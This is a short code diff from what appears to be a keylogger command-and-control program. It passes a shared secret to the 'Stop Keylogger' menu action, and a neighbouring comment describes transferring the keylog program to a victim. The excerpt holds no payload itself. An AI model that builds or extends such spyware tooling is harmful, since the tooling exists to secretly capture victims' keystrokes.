@@ -50,7 +50,7 @@ if __name__ == '__main__':
 
                 # MENU ITEM 2 - Stop Keylogger
                 if command == constants.PERFORM_MENU_ITEM_TWO:
-                    perform_menu_item_2(connected_clients)
+                    perform_menu_item_2(connected_clients, shared_secret)
 
                 # MENU ITEM 3 - Transfer keylog program to victim
                 if command == constants.PERFORM_MENU_ITEM_THREE:
